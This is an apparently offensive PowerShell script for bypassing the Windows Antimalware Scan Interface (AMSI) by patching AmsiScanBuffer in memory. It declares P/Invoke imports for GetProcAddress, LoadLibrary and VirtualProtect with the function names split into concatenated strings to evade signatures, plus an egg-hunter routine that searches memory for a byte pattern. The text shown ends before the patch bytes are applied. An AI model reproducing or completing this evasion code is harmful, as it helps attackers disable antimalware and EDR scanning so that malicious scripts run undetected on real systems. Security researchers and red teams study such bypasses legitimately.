<#
.SYNOPSIS
Microsoft has developed AMSI (Antimalware Scan Interface) as a method to defend against common malware execution and protect the end user. 
By default EDRs consumes AMSI events as part of interpreted script detection during runtime, its also the first protection against obfuscation.

.DESCRIPTION
Antimalware Scan Interface by patching AmsiScanBuffer function 
 
.EXAMPLE
Invoke-AmsiBypass1
 
Description
-----------
Patching AmsiScanBuffer
#>


$K2 = @"

using System;
using System.Runtime.InteropServices;

public class K2 {

    [DllImport("kernel32",EntryPoint="Get"+"Proc"+"Address")]
    public static extern IntPtr gpa(IntPtr hModule, string procName);

    [DllImport("kernel32",EntryPoint="Load"+"Library")]
    public static extern IntPtr ll(string name);

    [DllImport("kernel32",EntryPoint="Virtual"+"Protect")]
    public static extern bool vp(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Class Hunter {
    static [IntPtr] FindAddress([IntPtr]$address, [byte[]]$egg) {
        while ($true) {
            [int]$count = 0

            while ($true) {
                [IntPtr]$address = [IntPtr]::Add($address, 1)
                If ([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)) {
                    $count++
                    If ($count -eq $egg.Length) {
                        return [IntPtr]::Subtract($address, $egg.Length - 1)
                    }
                } Else { break }
            }
        }

        return $address
    }
}



